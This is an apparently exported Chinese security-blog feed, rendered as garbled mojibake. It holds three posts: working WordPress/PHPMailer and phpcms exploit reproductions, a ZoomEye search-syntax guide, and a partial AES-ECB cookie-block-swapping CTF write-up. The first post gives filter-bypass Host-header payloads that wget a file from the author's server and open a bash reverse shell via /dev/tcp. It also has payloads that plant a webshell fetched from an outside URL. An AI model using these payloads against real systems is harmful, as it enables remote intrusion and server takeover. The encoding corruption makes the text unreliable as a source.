Â∫îÁî®„ÄÇ9.ThinkPHPÊòØ‰∏Ä‰∏™Âø´ÈÄü„ÄÅÁÆÄÂçï„ÄÅÈù¢ÂêëÂØπË±°ÁöÑËΩªÈáèÁ∫ßPHPÂºÄÂèëÊ°ÜÊû∂„ÄÇ10.PHPUnitÊòØ‰∏Ä‰∏™ËΩªÈáèÁ∫ßÁöÑPHPÊµãËØïÊ°ÜÊû∂„ÄÇ11„ÄÅKYPHPÊîØÊåÅÂ§öÊï∞ÊçÆÂ∫ìÔºåÂ§öËØ≠Ë®ÄÔºåÂ§öÊ®°ÁâàÔºåÂ§öapp,Â§öÁºìÂ≠òÔºåÂ§öÁºñÁ†ÅÊ†ºÂºèÔºåÊ®°ÊùøÂ∏ÉÂ±ÄÔºåËá™ÂÆö‰πâÁ±ªÔºåËá™Âä®Âä†ËΩΩÂÖ¨ÂÖ±Á±ªÂ∫ì„ÄÇ12„ÄÅinitPHPÊòØ‰∏ÄÊ¨æËΩªÈáèÁ∫ßÁöÑphpÂºÄÂèëÊ°ÜÊû∂„ÄÇ13„ÄÅSpeedPHPÊòØ‰∏ÄÊ¨æÂÖ®ÂäüËÉΩÁöÑÂõΩ‰∫ßPHPÂ∫îÁî®Ê°ÜÊû∂Á≥ªÁªü„ÄÇ ÂèÇËÄÉÔºöhttp://baijiahao.baidu.com/s?id=1604870874054619554&amp;wfr=spider&amp;for=pc phpÂ∏∏Áî®cmswordpress phpcms dedecms(ÁªáÊ¢¶) Ecms(Â∏ùÂõΩcms) Discuz ÂèÇËÄÉÔºöhttps://www.cnblogs.com/yonge/articles/2662334.html cmsÂ∏∏ËßÅÊºèÊ¥ûwordpresswordpress ÁºñÂÜôÈááÁî®ÂéüÁîüphpÔºåÂπ∂‰∏çÊòØÂü∫‰∫éÊ°ÜÊû∂ÂºÄÂèë„ÄÇ ÊºèÊ¥ûÂΩ±ÂìçÁâàÊú¨ÔºöWordPress &lt;= 4.7.1 PHPMailer &lt; 5.2.18ÔºåÊ≠§Â§ÑËÆ∞ÂΩï‰∏ãÂ§çÁé∞ËøáÁ®ã„ÄÇ È¶ñÂÖàÊê≠Âª∫ÁéØÂ¢É„ÄÇ ‰∏ãËΩΩÈïúÂÉèÔºödocker pull medicean/vulapps:w_wordpress_6 ÂêØÂä®ÁéØÂ¢ÉÔºö docker run -it -d -p 8888:80 medicean/vulapps:w_wordpress_6 ÁÑ∂Âêé‰∫§‰∫íÂºèËøõÂÖ•dockerÈïúÂÉè docker exec -it 775c7c9ee1e1 /bin/bash ËøôÈáåÊê≠Âª∫8888Á´ØÂè£Êò†Â∞ÑÈïúÂÉèÁöÑ80 httpÊúçÂä°ÔºåÂÆâË£ÖÂ•Ω‰πãÂêéÊâìÂºÄÂ≠òÂú®ÊºèÊ¥ûÁöÑurl http://47.106.185.69:8888//wp-login.php?action=lostpasswordËøôÈáåËæìÂÖ•adminÔºåÂøÖÈ°ªË¶ÅÊúçÂä°Âô®Â≠òÂú®Áî®Êà∑ÊâçÂèØ‰ª•ÊàêÂäüÂÆåÊàêÊîªÂáª„ÄÇ bashÂèçÂºπshellÈ¶ñÂÖàÊàë‰ª¨ËøõË°åÂëΩ‰ª§ÊâßË°åÂèçÂºπshell„ÄÇ Á¨¨‰∏ÄÊ≠•Âú®ÊúçÂä°Âô®Á´ØÂàõÂª∫Â≠òÂú®ÂèçÂºπshellÂëΩ‰ª§ÁöÑÊñá‰ª∂ÔºåÁ¨¨‰∫åÊ≠• bashËøêË°åÂèçÂºπshellÁöÑÊñá‰ª∂„ÄÇ pocÊûÑÂª∫‰πãÂâçÂÖàÁªô‰∏™tip Á©∫Ê†º ==&gt; {substr{10}{1}{tod_log}} / ==&gt; {substr{0}{1}{spool_directory}}Á¨¨‰∏ÄÊ≠•pocÔºö Âéüpoc aa(any -froot@localhost -be ${run{/usr/bin/wget --output-document /tmp/rce xx.106.185.xx/a.txt}} null) ÁªïËøáÂêéÔºö aa(any -froot@localhost -be ${run{${substr{0}{1}{$spool_directory}}usr${substr{0}{1}{$spool_directory}}bin${substr{0}{1}{$spool_directory}}wget${substr{10}{1}{$tod_log}}--output-document${substr{10}{1}{$tod_log}}${substr{0}{1}{$spool_directory}}tmp${substr{0}{1}{$spool_directory}}rce${substr{10}{1}{$tod_log}}xx.106.185.xx${substr{0}{1}{$spool_directory}}a.txt}} null)xx.106.185.xxÊîπ‰∏∫Ëá™Â∑±ÁöÑIPÔºåpoc‰∏∫ËÆøÈóÆËá™Â∑±IP‰∏äÁöÑa.txtÂπ∂‰øùÂ≠òÂú®Ëá™Â∑±ÊúçÂä°Âô®‰∏äÁöÑ/tmp/rceÊñá‰ª∂Èáå„ÄÇÁ¨¨‰∫åÊ≠•Êàë‰ª¨ËøêË°årceÊñá‰ª∂Âç≥ÂèØ„ÄÇ ÂÖ∂‰∏≠xx.xx.xx.xx/a.txtÂÜÖÂÆπ‰∏∫Ôºö bash -i &gt;/dev/tcp/Ëá™Â∑±IP/6666 0&lt;&amp;1 2&gt;&amp;1 Á¨¨‰∫åÊ≠•pocÔºö Âéüpoc aa(any -froot@localhost -be ${run{/bin/bash /tmp/rce}} null) ÁªïËøáÂêéÔºö aa(any -froot@localhost -be ${run{${substr{0}{1}{$spool_directory}}bin${substr{0}{1}{$spool_directory}}bash${substr{10}{1}{$tod_log}}${substr{0}{1}{$spool_directory}}tmp${substr{0}{1}{$spool_directory}}rce}} null)ÂÆûÊàòÔºåÊâìÂºÄurl http://47.106.185.69:8888//wp-login.php?action=lostpassword ËæìÂÖ•adminÔºåÊèê‰∫§ÊäìÂåÖ„ÄÇ ‰øÆÊîπhostÂ§¥ÔºåÂπ∂‰∏î‰ΩøÁî®Á¨¨‰∏ÄÊù°poc„ÄÇÂ§çÂà∂Á¨¨‰∏ÄÊù°pocÂà∞hostÂ§¥Ôºå Âç≥ÂèØÁúãÂà∞ÊúçÂä°Âô®ÂàõÂª∫‰∫ÜrceÊñá‰ª∂„ÄÇ43 0Êé•‰∏ãÊù•‰ΩøÁî®Á¨¨‰∫å‰∏™pocÔºå‰∏ÄÊ†∑ÁöÑÂÅöÊ≥ïÁ≤òË¥¥Âà∞hostÂ§¥ÔºåËá™Â∑±ÁöÑÊúçÂä°Âô®ÁõëÂê¨Á´ØÂè£Á≠âÂæÖshell. ÂèØ‰ª•ÁúãÂà∞Â∑≤ÁªèÂèçÂºπÂõûÊù•shell„ÄÇ ÂàõÂª∫shellÂàõÂª∫shellÔºåÂæàÁÆÄÂçïÂ∞±ÂàõÂª∫Êñá‰ª∂Âç≥ÂèØÔºå Âéüpoc : aa(any -froot@localhost -be ${run{/usr/bin/wget --output-document /var/www/html/shell.php xx.xx.xx.xx/zk/one.txt}} null) ÁªïËøápocÔºö aa(any -froot@localhost -be ${run{${substr{0}{1}{$spool_directory}}usr${substr{0}{1}{$spool_directory}}bin${substr{0}{1}{$spool_directory}}wget${substr{10}{1}{$tod_log}}--output-document${substr{10}{1}{$tod_log}}${substr{0}{1}{$spool_directory}}var${substr{0}{1}{$spool_directory}}www${substr{0}{1}{$spool_directory}}html${substr{0}{1}{$spool_directory}}shell.php${substr{10}{1}{$tod_log}}xx.xx.xx.xx${substr{0}{1}{$spool_directory}}zk${substr{0}{1}{$spool_directory}}one.txt}} null)Âç≥ÂèØÊàêÂäüÂàõÂª∫ÔºåËøûÊé•ËèúÂàÄÂç≥ÂèØÔºå xx.xx.xx.xx/zk/one.txtÂÜô‰∏ÄÂè•ËØùÊú®È©¨Âç≥ÂèØ„ÄÇ ÁÑ∂ÂêéËøûÊé•shell.phpËèúÂàÄÂç≥ÂèØ„ÄÇ ÂèÇËÄÉÔºöhttps://www.cnblogs.com/ssooking/p/8893264.html phpcmsphpcms‰ªªÊÑèÊñá‰ª∂‰∏ä‰º†getshell‰∏∫‰∫ÜÊñπ‰æøÂ§çÁé∞ÔºåÊ∫êÁ†Å‰∏ãËΩΩ„ÄÇ ÈìæÊé•: https://pan.baidu.com/s/1geNQfyb ÂØÜÁ†Å: gxsdÂÆâË£ÖÊàêÂäüÂêéÔºåÊâìÂºÄÊ≥®ÂÜåÈ°µÈù¢„ÄÇ http://127.0.0.1/phpcms/index.php?m=member&amp;c=index&amp;a=register&amp;siteid=1Áõ¥Êé•postÂ¶Ç‰∏ãpocÔºåÁÑ∂ÂêéÊèê‰∫§Âç≥ÂèØËøîÂõûshellÂú∞ÂùÄ„ÄÇ poc:siteid=1&amp;modelid=11&amp;username=123456&amp;password=123456&amp;email=123456@qq.com&amp;info[content]=&lt;img src=http://files.hackersb.cn/webshell/antSword-shells/php_assert.php#.jpg&gt;&amp;dosubmit=1&amp;protocol=Ê≥®ÊÑèÔºöÂ∏êÂè∑ÊàñËÄÖÈÇÆ‰ª∂‰∏çËÉΩ‰∏éÂà´‰∫∫ÈáçÂ§ç„ÄÇÂê¶ÂàôÊó†Ê≥ïÊä•ÈîôËøîÂõûshellÂú∞ÂùÄÔºå‰ΩÜÊòØÂ∑≤ÁªèÂàõÂª∫„ÄÇ ËøîÂõûshellÂú∞ÂùÄÔºåÁõ¥Êé•ËøûÊé•Âç≥ÂèØ„ÄÇ ÂÖ∂‰∏≠src=xx.xx.xxÂèØ‰ª•Êê≠Âª∫Âú®Ëá™Â∑±ÂÖ¨ÁΩë‰∏äshellÊñá‰ª∂ÔºåÂÜôÈ©¨„ÄÇËÆ©ÊúçÂä°Âô®‰∏ãËΩΩ„ÄÇ Ëá™Â∑±Â§áÁî®„ÄÇhttp://47.106.185.69/a.phpÂèÇËÄÉÔºöhttps://www.hackersb.cn/hacker/219.html]]></content>
      <tags>
        <tag>webÊºèÊ¥û</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ÈíüÈ¶ó‰πãÁúºÁÆÄÂçï‰ΩøÁî®]]></title>
    <url>%2F2019%2F03%2F13%2F%E9%92%9F%E9%A6%97%E4%B9%8B%E7%9C%BC%2F</url>
    <content type="text"><![CDATA[ÁÆÄ‰ªã2013Âπ¥ÔºåÁü•ÈÅìÂàõÂÆáÂü∫‰∫é‰∫íËÅîÁΩëÂ§ßÊï∞ÊçÆÂü∫Á°ÄÊµãÁªòÁöÑÁêÜÂøµÔºåÊâìÈÄ†‰∫Ü‚ÄúZoomEye‚Äù(ÈíüÈ¶ó‰πãÁúº)ÁΩëÁªúÁ©∫Èó¥ÂÆâÂÖ®ÊêúÁ¥¢ÂºïÊìéÔºåÈíàÂØπÂÖ®ÁêÉÁΩëÁªúÁ©∫Èó¥Âü∫Á°ÄËÆæÊñΩ„ÄÅÁΩëÁªúËÆæÂ§áËøõË°åÊåáÁ∫πÁâπÂæÅÊ£ÄÁ¥¢ÔºåÂºÄÂàõ‰∫ÜÂõΩÂÜÖÁΩëÁªúÁ©∫Èó¥ËµÑÊ∫êÊµãÁªòÂ∑•‰ΩúÁöÑÂÖàÊ≤≥„ÄÇ ÈíüÈ¶ó‰πãÁúºÊòØ‰∏Ä‰∏™Ê£ÄÁ¥¢ÁΩëÁªúÁ©∫Èó¥ËäÇÁÇπÁöÑÊêúÁ¥¢ÂºïÊìé„ÄÇÈÄöËøáÂêéÁ´ØÁöÑÂàÜÂ∏ÉÂºèÁà¨Ëô´ÂºïÊìéÔºàÊó†ËÆ∫Ë∞ÅÂÆ∂ÁöÑÊêúÁ¥¢ÂºïÊìéÈÉΩÊòØËøôÊ†∑ÔºâÂØπÂÖ®ÁêÉËäÇÁÇπÁöÑÂàÜÊûêÔºåÂØπÊØè‰∏™ËäÇÁÇπÁöÑÊâÄÊã•ÊúâÁöÑÁâπÂæÅËøõË°åÂà§Âà´Ôºå‰ªéËÄåËé∑ÂæóËÆæÂ§áÁ±ªÂûã„ÄÅÂõ∫‰ª∂ÁâàÊú¨„ÄÅÂàÜÂ∏ÉÂú∞ÁÇπ„ÄÅÂºÄÊîæÁ´ØÂè£ÊúçÂä°Á≠â‰ø°ÊÅØ„ÄÇ ZoomEye ÊîØÊåÅÂÖ¨ÁΩëËÆæÂ§áÊåáÁ∫πÊ£ÄÁ¥¢Âíå Web ÊåáÁ∫πÊ£ÄÁ¥¢ ÁΩëÁ´ôÊåáÁ∫πÂåÖÊã¨Â∫îÁî®Âêç„ÄÅÁâàÊú¨„ÄÅÂâçÁ´ØÊ°ÜÊû∂„ÄÅÂêéÁ´ØÊ°ÜÊû∂„ÄÅÊúçÂä°Á´ØËØ≠Ë®Ä„ÄÅÊúçÂä°Âô®Êìç‰ΩúÁ≥ªÁªü„ÄÅÁΩëÁ´ôÂÆπÂô®„ÄÅÂÜÖÂÆπÁÆ°ÁêÜÁ≥ªÁªüÂíåÊï∞ÊçÆÂ∫ìÁ≠â„ÄÇËÆæÂ§áÊåáÁ∫πÂåÖÊã¨Â∫îÁî®Âêç„ÄÅÁâàÊú¨„ÄÅÂºÄÊîæÁ´ØÂè£„ÄÅÊìç‰ΩúÁ≥ªÁªü„ÄÅÊúçÂä°Âêç„ÄÅÂú∞ÁêÜ‰ΩçÁΩÆÁ≠â ÊêúÁ¥¢Â∏∏ËßÅÂëΩ‰ª§ÂÆö‰ΩçÂõΩÂÆ∂--- country:US ÊêúÁ¥¢ÂüéÂ∏Ç--- city:xx ÊêúÁ¥¢ÁªÑ‰ª∂--- app:ÁªÑ‰ª∂Âêç ÊêúÁ¥¢ÁâàÊú¨--- ver:5.0 ÊêúÁ¥¢Á´ØÂè£--- port:80 ÊêúÁ¥¢ÊúçÂä°Âêç-- serviceÔºöSSH ÊêúÁ¥¢Êìç‰ΩúÁ≥ªÁªü- OS:Linux ÊêúÁ¥¢ÁΩëÊÆµ--- cidr:1.1.1.1/24 ÊåáÂÆöÁΩëÁ´ôÂüüÂêçÊêúÁ¥¢-- site:www.baidu.com ÊåáÂÆö‰∏ªÊú∫Âêç--- hostname:www.baidu.com ÊåáÂÆöËÆæÂ§áÂêç--- device:router ÊåáÂÆöÈ¶ñÈ°µÂÖ≥ÈîÆËØç--- keyword:sec Âø´Êç∑ÈîÆÔºö ÊòæÁ§∫Â∏ÆÂä© shift+/ ÈöêËóèËØ•Â∏ÆÂä© ESC ÂõûÂà∞È¶ñÈ°µ shift È´òÁ∫ßÊêúÁ¥¢ Shift +s ËÅöÁÑ¶ÊêúÁ¥¢Ê°Ü s]]></content>
      <tags>
        <tag>ÊùÇ</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[aesÂä†ÂØÜÁöÑÂÆâÂÖ®ÈóÆÈ¢ò]]></title>
    <url>%2F2019%2F03%2F09%2Faes%E5%8A%A0%E5%AF%86%E7%9A%84%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98%2F</url>
    <content type="text"><![CDATA[Êú¨ÊñáÁî±ÂÆâÂÖ®ÂÆ¢ÂéüÂàõÂèëÂ∏ÉËΩ¨ËΩΩÔºåËØ∑ÂèÇËÄÉËΩ¨ËΩΩÂ£∞ÊòéÔºåÊ≥®ÊòéÂá∫Â§ÑÔºö https://www.anquanke.com/post/id/173088 aesÂä†ÂØÜÁÆÄ‰ªãAESÁÆóÊ≥ïÂÖ®Áß∞Advanced Encryption Standard,ÊòØDESÁÆóÊ≥ïÁöÑÊõø‰ª£ËÄÖÔºåÊó®Âú®Âèñ‰ª£DESÊàê‰∏∫ÂπøÊ≥õ‰ΩøÁî®ÁöÑÊ†áÂáÜÔºå‰∫é2001Âπ¥11Êúà26Êó•ÂèëÂ∏É‰∫éFIPS PUB 197ÔºåÂπ∂Âú®2002Âπ¥5Êúà26Êó•Êàê‰∏∫ÊúâÊïàÁöÑÊ†áÂáÜ„ÄÇ2006Âπ¥ÔºåÈ´òÁ∫ßÂä†ÂØÜÊ†áÂáÜÂ∑≤ÁÑ∂Êàê‰∏∫ÂØπÁß∞ÂØÜÈí•Âä†ÂØÜ‰∏≠ÊúÄÊµÅË°åÁöÑÁÆóÊ≥ï‰πã‰∏Ä„ÄÇ AESÊòØÂÖ∏ÂûãÁöÑÂØπÁß∞Âä†ÂØÜÁÆóÊ≥ïÔºåÂØπÁß∞Âä†ÂØÜ‰∏çÂêå‰∫émd5 shaÁöÑÂìàÂ∏åÊëòË¶ÅÁÆóÊ≥ïÔºåÂØπÁß∞Âä†ÂØÜÊòØÂèØÈÄÜÁöÑÔºåÈÄöÂ∏∏ÊòØÊòéÊñá+ÂØÜÈí•ÔºåÂÜçÂà©Áî®ÁÆóÊ≥ïÊù•Âä†ÂØÜÊàêÂØÜÊñáÔºåÂ¶ÇÊûúË¶ÅËøòÂéü‰πüÂæàÁÆÄÂçïÔºåÂè™Ë¶ÅÊ†πÊçÆÂØÜÈí•+ÂØÜÊñá+ÁîüÊàêÁÆóÊ≥ïÁöÑÈÄÜËøêÁÆóÔºåÂç≥ÂèØËß£Âá∫ÔºåÂØπÁß∞Âä†ÂØÜÁâπÁÇπ‰∏∫ÂèØÈÄÜÔºåÂπ∂‰∏îÂä†ÂØÜËß£ÂØÜÈÉΩÊòØ‰ΩøÁî®Âêå‰∏Ä‰∏™ÂØÜÈí•ÔºåËÄåÈùûÂØπÁß∞Âä†ÂØÜÂàôÊòØÂÖ¨Èí•ÁßÅÈí•Âä†Ëß£ÂØÜÊ®°ÂºèËøôÈáå‰∏çÂÅöËÆ®ËÆ∫„ÄÇ aesÂä†ÂØÜ‰∫îÁßçÊ®°ÂºèaesÂä†ÂØÜÁöÑÊñπÂºèÊúâ‰∫îÁßçÂ∑•‰Ωú‰ΩìÂà∂„ÄÇ 1.ÁîµÁ†ÅÊú¨Ê®°ÂºèÔºàElectronic Codebook Book (ECB)Ôºâ ËøôÁßçÊ®°Âºè‰∏ªË¶ÅÊòØÂ∞ÜÊòéÊñáÂàíÂàÜ‰∏∫Âá†‰∏™ÊòéÊñáÊÆµÔºåÂàÜÂùóÂä†ÂØÜÔºå‰ΩÜÊòØÂä†ÂØÜÂØÜÈí•ÊòØÁõ∏ÂêåÁöÑ„ÄÇ 2.ÂØÜÁ†ÅÂàÜÁªÑÈìæÊé•Ê®°ÂºèÔºàCipher Block Chaining (CBC)Ôºâ ËøôÁßçÊ®°ÂºèÊòØÂÖàÂ∞ÜÊòéÊñáÂàáÂàÜÊàêËã•Âπ≤Â∞èÊÆµÔºåÁÑ∂ÂêéÊØè‰∏ÄÂ∞èÊÆµ‰∏éÂàùÂßãÂùóÊàñËÄÖ‰∏ä‰∏ÄÊÆµÁöÑÂØÜÊñáÊÆµËøõË°åÂºÇÊàñËøêÁÆóÂêéÔºåÂÜç‰∏éÂØÜÈí•ËøõË°åÂä†ÂØÜ„ÄÇ 3.ËÆ°ÁÆóÂô®Ê®°ÂºèÔºàCounter (CTR)Ôºâ4.ÂØÜÁ†ÅÂèçÈ¶àÊ®°ÂºèÔºàCipher FeedBack (CFB)Ôºâ5.ËæìÂá∫ÂèçÈ¶àÊ®°ÂºèÔºàOutput FeedBack (OFB)Ôºâ ÂÖ∂‰∏≠ÂàÜÁªÑÂ¶ÇÔºåaes-128-ecbÂç≥‰∏∫16Â≠óËäÇ‰∏∫‰∏ÄÁªÑÔºå16Â≠óËäÇÂç≥‰∏∫128‰Ωç„ÄÇ ÂÖ∂‰ªñ‰∏âÁßçÊ®°ÂºèËæÉ‰∏∫Â§çÊùÇÔºåÊú¨Êñá‰ªÖËÆ®ËÆ∫Ââç‰∏§ÁßçÂä†ÂØÜÁöÑÂÆâÂÖ®ÊÄß„ÄÇ aes-ecbÂä†ÂØÜ aes-ecbÂä†ÂØÜÊòØÂ∞Ü‰∏ÄÊÆµÊòéÊñáÔºåÊåâÁÖßÂõ∫ÂÆöÈïøÂ∫¶ÂàÜÁªÑÔºåÁÑ∂ÂêéÂØπÊØè‰∏Ä‰∏™ÂàÜÁªÑÔºåÊåâÁÖßÁÆóÊ≥ï‰ΩøÁî®Âõ∫ÂÆöÁöÑÂØÜÈí•ËøõË°åÂä†ÂØÜ„ÄÇÂÅáËÆæ123456Âä†ÂØÜ„ÄÇÈÇ£‰πà123‰∏∫‰∏ÄÁªÑÂä†ÂØÜÔºå456‰∏∫‰∏ÄÁªÑÂä†ÂØÜÔºåÁÑ∂Âêé‰∏§ÊÆµÊòéÊñáÂä†ÂØÜÂêéÁöÑÂØÜÊñáÊãºÂú®‰∏ÄËµ∑ÔºåÂ∞±ÁÆóÂÆåÊï¥ÁöÑÂØÜÊñá„ÄÇ Ê≥®ÊÑèÔºöËøôÈáåÊØè‰∏ÄÁªÑÁöÑÂä†ÂØÜÈÉΩÊòØ‰ΩøÁî®Áõ∏ÂêåÁöÑÂØÜÈí•ÔºåÁõ∏ÂêåÁöÑÁÆóÊ≥ïÔºåÊâÄ‰ª•Âú®ËøôÁßçÊú∫Âà∂‰∏ãÔºåÂæàÂèØËÉΩÂá∫Áé∞ÂÆâÂÖ®ÈóÆÈ¢ò„ÄÇ ÊØîÂ¶ÇÔºöÂú®Ë∫´‰ªΩËÆ§ËØÅ‰∏≠ÔºåÊü•ËØ¢Áî®Êà∑ÊòØÂê¶ÊòØÁÆ°ÁêÜÂëòËøòÊòØÊôÆÈÄöÁî®Êà∑ÔºåÂ¶ÇÊûúis_root=1Âàô‰∏∫ÁÆ°ÁêÜÂëòÔºåÂ¶ÇÊûú‰∏ç‰∏∫1Âàô‰∏∫ÊôÆÈÄöÁî®Êà∑ÔºåÂ¶ÇÊûúÈááÁî®aes-ecbÂä†ÂØÜÔºåÂØπÂéüÊñáËøõË°åÂàÜÁªÑÂä†ÂØÜ„ÄÇ ÊòéÊñáÔºöuser_id:1.000000 is_root:0ÔºàÂÖ∂‰∏≠is_rootÊù•Âà§Êñ≠ÊòØÂê¶‰∏∫ÁÆ°ÁêÜÂëò„ÄÇÔºâ ÁÑ∂ÂêéÁî®‰∏ÄÊÆµÂØÜÈí•Âä†ÁÆóÊ≥ïËøõË°åÂä†ÂØÜ„ÄÇËøôÁßçÊèê‰∫§ÁöÑÂä†ÂØÜÊï∞ÊçÆÊòØÂú®cookie‰∏≠Êèê‰∫§ÔºåÊòéÊñá‰∏çÂèØÊéßÔºå‰ΩÜÊòØÂØÜÊñáÊòØÂèØÊéßÁöÑÔºå‰ΩÜÁî±‰∫éÊòØËøõË°åÂàÜÁªÑËøõË°åÔºåÊâÄ‰ª•Êàë‰ª¨ÂèØ‰ª•Êé®ÁÆóÂá∫ÊØè‰∏ÄÂàÜÁªÑÊòéÊñáÂØπÂ∫îÁöÑÂØÜÊñáÔºåÂÅáËÆæÊòéÊñáÂÖ´‰∏™‰∏ÄÁªÑÊù•ËøõË°åÂä†ÂØÜÔºåÂàÜÁªÑÂêéÂèò‰∏∫ ÔºàÊèêÁ§∫Ôºö‰ªÖ‰ªÖÊòØÂÅáËÆæÁêÜÊÉ≥ÊÉÖÂÜµÂÖ´‰ΩçÔºåÂÆûÈôÖÂπ∂‰∏çÊòØÔºâ Á¨¨‰∏ÄÁªÑÔºöis_user Á¨¨‰∫åÁªÑÔºö1.000000 Á¨¨‰∏âÁªÑ: is_root: Á¨¨ÂõõÁªÑÔºö 0Ôºà‰∏çÂ§üÁöÑÂÖ´‰ΩçËá™Âä®Â°´ÂÖÖÔºâ ÂÖ∂‰∏≠user_id ÈÄöÂ∏∏ÊÉÖÂÜµ‰∏ãÊàë‰ª¨ÂâçÁ´ØÂèØ‰ª•‰øÆÊîπÔºåËøõË°å‰øÆÊîπ‰∏∫1.000000ÔºåÊ≠§Êó∂ÂéüÊñáË¢´Âä†ÂØÜ‰πãÂêé‰∏∫ÂõõÁªÑ ÊØèÁªÑ‰∏∫ÂÖ´‰∏™Êï∞Â≠óÁöÑÂØÜÊñá ÂÅáËÆæÂä†ÂØÜÂêéÂØÜÊñá‰∏∫ c4ca4238a0b923820dcc509a6f75849b Âú®cookie‰∏≠Ë¢´Êèê‰∫§ÔºåÂ∞ÜÂØÜÊñáÂàÜ‰∏∫ÂõõÁªÑ c4ca4238 a0b92382 0dcc509a 6f75849bÊ≠§Êó∂ÂØÜÊñáÊàë‰ª¨ÊòØÂèØÊéßÁöÑÔºåÂ¶ÇÊûúÊ≠£Â∏∏Êèê‰∫§ÔºåÊúçÂä°Âô®Ëß£ÂØÜ‰πãÂêé‰∏∫user_id:1.000000 is_root:0ÔºåÂæàÊòæÁÑ∂Êàë‰ª¨‰∏çÊòØÁÆ°ÁêÜÂëòÔºå‰ΩÜÊòØÂ¶ÇÊûúÂ∞ÜÁ¨¨‰∫åÁªÑÂØÜÊñáÂíåÁ¨¨ÂõõÁªÑÂØÜÊñáÊõøÊç¢Âë¢ÔºåÈÇ£‰πàuser_idÂ∞±ÊòØ0Ôºåis_rootÂ∞±ÊòØ1.000000„ÄÇÊúçÂä°Âô®Â∞±Ëß£Êûê‰∏∫user_id:0xxxxxxx(xx‰∏∫Â°´ÂÖÖÂ≠óÁ¨¶) is_root:1.000000ÔºåÊòæÁÑ∂Êàë‰ª¨‰∏çÈúÄË¶ÅÁü•ÈÅìÂØÜÈí•ÔºåÂêåÊ†∑ÂèØ‰ª•ËøõË°åÁªïËøá„ÄÇ ËøòÊúâ‰∏ÄÂàôÂú®ËΩ¨Ë¥¶‰∏≠ÔºåÂ¶ÇÊûúÈááÁî®aes-128-ecbÂä†ÂØÜÔºåÂú®cookie‰∏≠‰ΩøÁî®ecbÂàÜÁªÑÂä†ÂØÜÔºåÊØîÂ¶Ç ‰ªòÊ¨æ‰∫∫Ë¥¶Êà∑ÔºöXXX //ÂÅáËÆæÂØÜÊñáabcÊî∂Ê¨æ‰∫∫Ë¥¶Êà∑ÔºöXXX //ÂÅáËÆæÂØÜÊñáefg ËØïÊÉ≥‰∏Ä‰∏ãÔºå‰∏ÄÊó¶Ëøô‰∏™ÂàÜÁªÑÊòØÂàöÂ•ΩÂàÜ‰∏∫ÂõõÁªÑÔºåÊàë‰ª¨‰ªÖ‰ªÖÂ∞Üabc‰∏éefg‰∫§Êç¢ÔºåÈÇ£‰∏çÂ∞±ÈÄ†Êàê‰∫ÜÊîØ‰ªòÊî∂Ê¨æÂèçËΩ¨ÔºåÂá†‰πé‰∏çÈúÄË¶Å‰ªÄ‰πàÊäÄÊúØÂ∞±ÂèØ‰ª•ÈÄ†Êàê‰∏•ÈáçÁöÑÊîªÂáª„ÄÇ ctf-Ê°à‰æãÊé•‰∏ãÊù•‰ª•ÁúüÂÆûÈ¢òÁõÆÊù•ËøõË°åËØ¶Ëß£„ÄÇ ctf addressÔºöhttps://mixer-f3834380.challenges.bsidessf.net/ÔºàÂõΩÂ§ñÁöÑ‰∏ÄÈÅìctfÔºâ È¶ñÂÖàÂ∞ùËØïËæìÂÖ•admin admin ÁôªÈôÜ„ÄÇ ËøîÂõûÂÜÖÂÆπÈáçÁÇπ‰∏∫Á∫¢Ëâ≤Ê°ÜÂÜÖÁöÑ‰∏úË•øÔºåÈúÄË¶Å‰ΩøÂæóÁ¨¨‰∏â‰∏™ÂèÇÊï∞ is_admin=1Âç≥ÂèØËé∑ÂæóflagÔºå‰ΩÜÊòØsession cookieÂπ∂‰∏çÊòØËøô‰∏™È¢òÂÖ≥Ê≥®ÁöÑÁÇπÔºåÊé•‰∏ãÊù•Â∞±ÊòØÊäìÂåÖÂàÜÊûêÂèÇÊï∞„ÄÇ‰øÆÊîπÂèÇÊï∞„ÄÇ ÁªèÊµãËØï‰øÆÊîπurlÔºåget cookie post‰º†ÂèÇÈÉΩ‰∏çËÉΩÊîπÂèòis_adminÁöÑÂÄºÔºåÊâÄ‰ª•Âè™Êúâ‰∏ÄÁßçÂèØËÉΩÔºåÊòØÂú®cookieÈáåÁöÑuserÂèÇÊï∞ÈáåÂä†ÂØÜ‰∫ÜÔºåÁÑ∂Âêé‰º†ÈÄíÁªôÊúçÂä°Âô®ÔºåÊàë‰ª¨getÂèÇÊï∞‰º†ÂÖ•ÁöÑË¥¶Âè∑ÂØÜÁ†ÅË¢´ÊúçÂä°Âô®Á´ØÂä†ÂØÜÔºåÁÑ∂ÂêéÊúçÂä°Âô®ËøîÂõûÊù•Âä†ÂØÜÂêéÁöÑuser‰ø°ÊÅØ„ÄÇ Êé•‰∏ãÊù•ÊµãËØïÊòØ‰ΩïÁßçÂä†ÂØÜÔºåÊµãËØï‰∏∫aes-ecbÂä†ÂØÜÔºåÈÇ£‰πàÊòØÂ¶Ç‰ΩïÁ°ÆÂÆöÁöÑÂë¢Ôºå Áî±‰∫éecbÊòØÂàÜÁªÑÂä†ÂØÜÔºåÊâÄ‰ª•‰∏ÄÊó¶‰∏ÄÁªÑÁöÑÂØÜÊñáÊàë‰ª¨‰øÆÊîπ‰∫ÜÔºåÂÖ∂‰ªñÁªÑÁöÑÂØÜÊñáËß£ÂØÜ‰πãÂêéÊòØÊ≠£Â∏∏ÁöÑÔºåËÄåË¢´Êàë‰ª¨‰øÆÊîπ‰∫ÜÁöÑÂØÜÊñáËß£ÂØÜ‰ºöÊòØ‰π±Á†ÅÔºåÊâÄ‰ª•Êàë‰ª¨Èöè‰æø‰øÆÊîπ‰∏ãuserÂèÇÊï∞„ÄÇ ÂèØ‰ª•ÁúãÂà∞Êä•ÈîôÔºåÂπ∂‰∏îÁ¨¨‰∏ÄÁªÑÁöÑÂØÜÊñáËß£ÂØÜÂêéÊòØ‰π±Á†ÅÔºåËÄåÂÖ∂‰ªñÁªÑÁöÑÂä†ÂØÜËß£ÂØÜÂêé‰∏∫Ê≠£Â∏∏ÔºåÊâÄ‰ª•ÁåúÊµãËøô‰∏ÄÂÆöÊòØaes-ecbÁöÑÂàÜÁªÑÂä†ÂØÜÁöÑÊñπÂºèÔºå 